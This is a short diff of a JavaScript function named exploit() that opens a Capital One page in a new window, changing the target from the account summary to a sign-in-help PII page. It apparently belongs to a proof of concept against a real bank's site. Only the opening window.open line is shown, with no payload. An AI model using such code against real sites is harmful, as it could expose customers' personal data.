@@ -1,7 +1,9 @@
 
 function exploit()
 {
-     let target =  window.open('https://myaccounts.capitalone.com/accountSummary');
+     let target =  window.open('https://verified.capitalone.com/sign-in-help/pii');
+
+    // https://myaccounts.capitalone.com/accountSummary 
      
 
 
